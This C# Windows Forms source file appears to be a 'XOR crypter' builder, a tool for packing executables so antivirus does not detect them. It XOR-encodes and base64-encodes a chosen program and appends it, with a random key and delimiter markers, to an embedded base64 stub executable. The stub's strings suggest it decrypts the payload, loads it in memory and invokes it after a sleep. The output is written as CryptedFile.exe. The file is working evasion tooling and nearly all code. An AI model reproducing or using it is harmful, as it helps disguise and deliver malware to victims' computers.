using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Management;
using System.Security.Cryptography;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;


namespace XOR_crypter
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }
        private static byte[] encodeBytes(byte[] bytes, String pass)
        {
            byte[] XorBytes = Encoding.Unicode.GetBytes(pass);

            for (int i = 0; i < bytes.Length; i++)
            {
                bytes[i] ^= XorBytes[i % 16];
            }

            return bytes;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.ShowDialog();
            string filename = ofd.FileName;

            //stub bytes
            byte[] stub = Convert.FromBase64String("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GgAAAAAABAAAAAAAAAAAAAAAkwCEAwAAAAAEAAAAAAAAAAAAAACTAI8CAAAAAAQAAAAAAAAAAAAAAJwAQgIAAAAAAAAAAAEAAAArAwAAAAAARm9ybTEAPE1vZHVsZT4AU3lzdGVtLklPAG1zY29ybGliAFhPUi1jcnlwdGVyLXN0dWIAWE9SX2NyeXB0ZXJfc3R1YgBUaHJlYWQATG9hZABSZXBsYWNlAHNldF9BdXRvU2NhbGVNb2RlAGdldF9Vbmljb2RlAEludm9rZQBJRGlzcG9zYWJsZQBGaWxlAENhcHR1cmUATWV0aG9kQmFzZQBEaXNwb3NlAERlYnVnZ2FibGVBdHRyaWJ1dGUAQXNzZW1ibHlUaXRsZUF0dHJpYnV0ZQBUYXJnZXRGcmFtZXdvcmtBdHRyaWJ1dGUAQXNzZW1ibHlGaWxlVmVyc2lvbkF0dHJpYnV0ZQBBc3NlbWJseUluZm9ybWF0aW9uYWxWZXJzaW9uQXR0cmlidXRlAEFzc2VtYmx5Q29uZmlndXJhdGlvbkF0dHJpYnV0ZQBDb21waWxhdGlvblJlbGF4YXRpb25zQXR0cmlidXRlAEFzc2VtYmx5UHJvZHVjdEF0dHJpYnV0ZQBBc3NlbWJseUNvbXBhbnlBdHRyaWJ1dGUAUnVudGltZUNvbXBhdGliaWxpdHlBdHRyaWJ1dGUAQnl0ZQBnZXRfVmFsdWUAWE9SLWNyeXB0ZXItc3R1Yi5leGUAc2V0X0NsaWVudFNpemUAU3lzdGVtLlRocmVhZGluZwBFbmNvZGluZwBTeXN0ZW0uUnVudGltZS5WZXJzaW9uaW5nAEZyb21CYXNlNjRTdHJpbmcAZGlzcG9zaW5nAFN5c3RlbS5EcmF3aW5nAE1hdGNoAFN5c3RlbS5Db21wb25lbnRNb2RlbABDb250YWluZXJDb250cm9sAFByb2dyYW0AZ2V0X0l0ZW0AU3lzdGVtAFJhbmRvbQBGb3JtAE1haW4AZ2V0X0xvY2F0aW9uAFN5c3RlbS5SZWZsZWN0aW9uAE1hdGNoQ29sbGVjdGlvbgBNZXRob2RJbmZvAFNsZWVwAElDb250YWluZXIALmN0b3IAU3lzdGVtLkRpYWdub3N0aWNzAFN5c3RlbS5SdW50aW1lLkNvbXBpbGVyU2VydmljZXMAWE9SX2NyeXB0ZXJfc3R1Yi5Gb3JtMS5yZXNvdXJjZXMARGVidWdnaW5nTW9kZXMATWF0Y2hlcwBHZXRCeXRlcwBkZWNyeXB0Qnl0ZXMAYnl0ZXMAYXJncwBTeXN0ZW0uV2luZG93cy5Gb3JtcwBTeXN0ZW0uVGV4dC5SZWd1bGFyRXhwcmVzc2lvbnMAcGFzcwBjb21wb25lbnRzAE9iamVjdABTcGxpdABFbnZpcm9ubWVudABJbml0aWFsaXplQ29tcG9uZW50AGdldF9FbnRyeVBvaW50AGdldF9UaWNrQ291bnQAQ29udmVydABOZXh0AFN5c3RlbS5UZXh0AHNldF9UZXh0AFJlYWRBbGxUZXh0AFJlZ2V4AEdldEVudHJ5QXNzZW1ibHkAAAALRgBvAHIAbQAxAAA1cwBzAGQAZgBzAGYAZwB2AGQAZgBqAHUALgAqAHMAcwBkAGYAcwBmAGcAdgBkAGYAagB1AAAZcwBzAGQAZgBzAGYAZwB2AGQAZgBqAHUAAAEAAOGGzscib2RKv5QLBO+9FTUABCABAQgDIAABBSABARERBCABAQ4EIAEBAgUgAQERSQUgAgEICAUgAQERTQQHAg4OAwAACAUgAggICAQAAQEIBAAAEmEDIAAOBAABDg4FIAESbQ4FIAEScQgFIAIODg4GAAIdDg4OBQABHQUOBgABEmEdBQUgABKAgQYgAhwcHRwFBwIdBQgFAAASgIkFIAEdBQ4It3pcVhk04IkIsD9ffxHVCjoDBhI1BQABAR0OBwACHQUdBQ4IAQAIAAAAAAAeAQABAFQCFldyYXBOb25FeGNlcHRpb25UaHJvd3MBCAEAAgAAAAAASQEAGi5ORVRGcmFtZXdvcmssVmVyc2lvbj12NC42AQBUDhRGcmFtZXdvcmtEaXNwbGF5TmFtZRIuTkVUIEZyYW1ld29yayA0LjYVAQAQWE9SLWNyeXB0ZXItc3R1YgAADAEAB1JlbGVhc2UAAAwBAAcxLjAuMC4wAAAKAQAFMS4wLjAAAAAAALQAAADOyu++AQAAAJEAAABsU3lzdGVtLlJlc291cmNlcy5SZXNvdXJjZVJlYWRlciwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5I1N5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");
            string key = Path.GetRandomFileName().Split('.')[0];
            byte[] dataOfEnc = encodeBytes(File.ReadAllBytes(filename), key);
            byte[] base64 = Encoding.UTF8.GetBytes(Convert.ToBase64String(dataOfEnc));
            FileStream fs = new FileStream("CryptedFile.exe", FileMode.CreateNew, FileAccess.Write);
            fs.Write(stub, 0, stub.Length);
            fs.Write(Encoding.UTF8.GetBytes("ssdfsfgvdfju"), 0, Encoding.UTF8.GetBytes("ssdfsfgvdfju").Length);
            fs.Write(Encoding.UTF8.GetBytes(key), 0, Encoding.UTF8.GetBytes(key).Length);
            fs.Write(Encoding.UTF8.GetBytes("ssdfsfgvdfju"), 0, Encoding.UTF8.GetBytes("ssdfsfgvdfju").Length);
            fs.Write(base64, 0, base64.Length);
            fs.Close();

            //close form and exit
            Close();
        }
    }
}
